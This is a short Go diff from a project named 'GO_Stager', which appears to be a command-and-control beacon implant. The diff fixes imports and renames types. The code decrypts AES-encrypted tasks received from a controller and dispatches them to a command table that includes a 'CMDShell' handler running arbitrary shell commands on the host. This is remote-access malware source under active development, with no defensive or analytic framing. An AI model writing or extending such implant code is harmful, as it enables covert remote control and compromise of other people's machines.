@@ -2,8 +2,10 @@ package main
 
 import (
 	"GO_Stager/AES" // 假设你已经实现了AES加密解密
+	"GO_Stager/Command"
 	"GO_Stager/config"
 	"GO_Stager/sysinfo"
+	"GO_Stager/util"
 	"bytes"
 	"crypto/tls"
 	"encoding/base64"
@@ -15,7 +17,6 @@ import (
 	"strings"
 	"sync"
 	"time"
-	"util"
 )
 
 type BeaconData struct {
@@ -46,12 +47,12 @@ type BeaconTaskOut struct {
 }
 
 // 命令处理
-type Command struct {
+type Commands struct {
 	Name    string
 	Execute func(task BeaconTask) (string, error)
 }
 
-var commands = []Command{
+var commands = []Commands{
 	{
 		Name: "ls",
 		Execute: func(task BeaconTask) (string, error) {
@@ -71,9 +72,10 @@ var commands = []Command{
 		},
 	},
 	{
-		Name: "shell",
+		Name: "CMDShell",
 		Execute: func(task BeaconTask) (string, error) {
-			result, _ := Command.ShellExecute(task.Command, task.Args)
+			result, _ := Command.ShellExecute(task.Args)
+			util.Println(result)
 			return util.Sprintf("Result is %s", result), nil
 		},
 	},
@@ -268,9 +270,8 @@ func (hc *HTTPComms) HandleTaskAsync(task BeaconTask) {
 	task.Command, _ = AES.Decrypt(task.Command)
 	task.Args, _ = AES.Decrypt(task.Args)
 	task.File, _ = AES.Decrypt(task.File)
-
 	// 查找命令
-	var command *Command
+	var command *Commands
 	for _, cmd := range commands {
 		if strings.EqualFold(cmd.Name, task.Command) {
 			command = &cmd
